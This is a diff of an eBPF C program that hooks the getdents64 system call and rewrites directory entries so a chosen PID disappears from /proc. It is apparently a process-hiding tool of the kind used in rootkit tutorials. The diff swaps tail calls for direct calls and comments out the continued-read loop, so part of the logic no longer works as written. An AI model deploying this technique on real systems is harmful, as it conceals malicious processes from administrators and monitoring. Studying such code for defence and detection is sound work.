@@ -3,7 +3,7 @@
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
-#include "common.h"
+#include "pidhide.h"
 
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
 
@@ -49,11 +49,15 @@ struct {
 // Optional Target Parent PID
 const volatile int target_ppid = 0;
 
+#define MAX_PID_LENTH 16
+
 // These store the string represenation
 // of the PID to hide. This becomes the name
 // of the folder in /proc/
 const volatile int pid_to_hide_len = 0;
-const volatile char pid_to_hide[max_pid_len];
+const volatile char pid_to_hide[MAX_PID_LENTH];
+
+int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx);
 
 // struct linux_dirent64 {
 //     u64        d_ino;    /* 64-bit inode number */
@@ -111,7 +115,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
     struct linux_dirent64 *dirp = 0;
     int pid = pid_tgid >> 32;
     short unsigned int d_reclen = 0;
-    char filename[max_pid_len];
+    char filename[MAX_PID_LENTH];
 
     unsigned int bpos = 0;
     unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
@@ -140,7 +144,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
             // ***********
             bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
             bpf_map_delete_elem(&map_buffs, &pid_tgid);
-            bpf_tail_call(ctx, &map_prog_array, PROG_02);
+            handle_getdents_patch(ctx);
         }
         bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
         bpos += d_reclen;
@@ -148,10 +152,10 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 
     // If we didn't find it, but there's still more to read,
     // jump back the start of this function and keep looking
-    if (bpos < total_bytes_read) {
-        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
-        bpf_tail_call(ctx, &map_prog_array, PROG_01);
-    }
+    // if (bpos < total_bytes_read) {
+    //     bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
+    //     handle_getdents_exit(ctx);
+    // }
     bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
     bpf_map_delete_elem(&map_buffs, &pid_tgid);
 
@@ -181,7 +185,7 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
     bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
 
     // Debug print
-    char filename[max_pid_len];
+    char filename[MAX_PID_LENTH];
     bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
     filename[pid_to_hide_len-1] = 0x00;
     bpf_printk("[PID_HIDE] filename previous %s\n", filename);
